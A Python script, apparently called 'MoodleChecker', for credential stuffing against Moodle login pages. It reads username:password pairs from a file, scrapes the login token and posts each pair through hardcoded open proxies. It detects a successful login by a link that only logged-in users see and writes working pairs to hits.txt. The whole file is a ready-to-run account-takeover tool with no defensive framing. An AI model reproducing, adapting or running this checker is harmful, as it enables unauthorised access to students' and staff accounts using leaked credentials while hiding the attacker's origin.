import requests
import re
import sys
import time
import random
from bs4 import BeautifulSoup

url = ""  # URL of the login page
checkIfLoginItem = "" # Url of some a tag that is only when you are in. It could be something like "https://myMoodle.com/user/files.php"


loginTokenRegex = re.compile('type="hidden" name="logintoken" value="(\w*)"', re.IGNORECASE)
USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"
headers = {"user-agent": USER_AGENT}

proxyList = [
    {"https" : "http://20.151.27.156:3128"},
    {"https" : "http://18.139.173.12:3128"},
    {"https" : "http://104.43.230.151:3128"},
    {"https" : "http://51.77.123.247:80"},
    {"https" : "http://47.89.153.213:80"},
    {"https" : "http://14.140.131.82:3128"},
]

proxyThatWorks = {
    "https" : "http://20.151.27.156:3128"
}

def check(username, password):
    # random.shuffle(proxyList)
    # proxy = proxyList[0]
    proxy = proxyThatWorks
    try:
        req = requests.session()
        req.headers.update(headers)
        res = req.get(url,proxies=proxy)
        if res.status_code == 200:
            Ltoken = loginTokenRegex.search(res.text).group(1)
            res2 = req.post(url,proxies=proxy, data={
                "anchor": "",
                "logintoken": Ltoken,
                "username": username,
                "password": password,
                "token": "",
            })
            if res2.status_code == 200:
                checkIfLogin = BeautifulSoup(res2.text, "html.parser").find('a', attrs={'href':checkIfLoginItem})
                if checkIfLogin:
                    return True
                else:
                    return False
            else:
                print("Error making the petition to server and logging ("+ str(res.status_code) + ")")
                return False
        else:
            print("Error making the petition to server "+ str(res.status_code) + ")")
            return False
    except:
        print("Something went wrong, maybe the proxy doesn't work. You can remove it or try with another one")


logo = ("""
 ███▄ ▄███▓ ▒█████   ▒█████  ▓█████▄  ██▓    ▓█████  ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
▓██▒▀█▀ ██▒▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▓██▒    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▓██    ▓██░▒██░  ██▒▒██░  ██▒░██   █▌▒██░    ▒███   ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
▒██    ▒██ ▒██   ██░▒██   ██░░▓█▄   ▌▒██░    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒   ░██▒░ ████▓▒░░ ████▓▒░░▒████▓ ░██████▒░▒████▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ░ ▒░▓  ░░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░  ░      ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ ░ ░ ▒  ░ ░ ░  ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░      ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░   ░ ░      ░   ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
       ░       ░ ░      ░ ░     ░        ░  ░   ░  ░░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
                              ░                     ░                       ░                               `
 """)

print(logo)

# Open file with accouns
with open(sys.argv[1], 'r') as file:
    txtContent = file.readlines()

print("Starting checking...")

for user in txtContent:
    user = user.replace("\n", "");
    if "https" not in user:
        user = user.split(":")
        time.sleep(1)
        if check(user[0],user[1]):
            print(f"Found working: {user[0]}:{user[1]}")
            # Write in hits file the user who is correct
            with open("hits.txt", "a") as file:
               file.write(f'{user[0]}:{user[1]}\n')

print("All accounts is already checked. Please check hits file. Thx for use this script ;)")